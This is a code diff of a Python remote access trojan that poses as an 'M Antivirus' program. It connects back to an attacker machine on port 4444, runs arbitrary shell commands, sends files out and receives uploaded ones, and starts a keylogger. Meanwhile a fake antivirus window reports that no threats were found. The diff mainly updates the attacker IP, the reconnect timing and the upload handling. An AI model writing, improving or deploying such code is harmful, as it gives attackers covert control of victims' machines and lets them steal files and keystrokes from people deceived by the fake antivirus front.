@@ -7,6 +7,7 @@ import threading
 import tkinter as tk
 from tkinter import ttk
 from keylogger import startKeylogger
+from antiVi import start_application
 
 
 # RAT:
@@ -15,10 +16,10 @@ def connect():
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect(('192.168.1.4', 4444))  # IP and Port of the attacker machine
+			s.connect(('192.168.1.7', 4444))  # IP and Port of the attacker machine
 			return s
 		except Exception:
-			time.sleep(10)
+			time.sleep(5)
 			continue
 
 
@@ -60,15 +61,17 @@ def rat_client():
 			elif command.startswith('download '):
 				path = command[9:]
 				if os.path.exists(path):
-					s.send(str.encode(read_file(path)))
+					s.send(read_file(path).encode())
 				else:
 					s.send(str.encode("File not found"))
 			elif command.startswith('upload '):
-				path = command[7:]
+				path = command [7:]
 				content = s.recv(100000).decode()
+				content = base64.b64decode(content.encode())
 				write_file(path, content)
 				s.send(str.encode("Upload complete"))
 			elif command == 'keylogger':
+				s.send(str.encode("Keylogging ..."))
 				keylogger_thread = threading.Thread(target=startKeylogger, daemon=True)
 				keylogger_thread.start()
 			elif command == 'sendLog':
@@ -79,36 +82,17 @@ def rat_client():
 			else:
 				output = execute_commands(command)
 				s.send(str.encode(output))
+	except Exception as e :
+		print(f"An error occurred: {e}")
+
 	finally:
 		s.close()
 
 
 # M antivirus GUI:
 
-def start_scan():
-	progress['value'] = 100
-	root.update_idletasks()
-	result.config(text="Scan Completed No threats found :) ")
-
-
 def create_gui():
-	global root, progress, result
-	root = tk.Tk()
-	root.title("M Antivirus")
-
-	frame = ttk.Frame(root, padding=20)
-	frame.grid(row=0, column=0)
-
-	scanButton = ttk.Button(frame, text="Start Scan", command=start_scan)
-	scanButton.grid(row=0, column=0, pady=10)
-
-	progress = ttk.Progressbar(frame, orient=tk.HORIZONTAL, length=200, mode='determinate')
-	progress.grid(row=1, column=0, pady=10)
-
-	result = ttk.Label(frame, text="")
-	result.grid(row=2, column=0, pady=10)
-
-	root.mainloop()
+	start_application()
 
 
 # Main
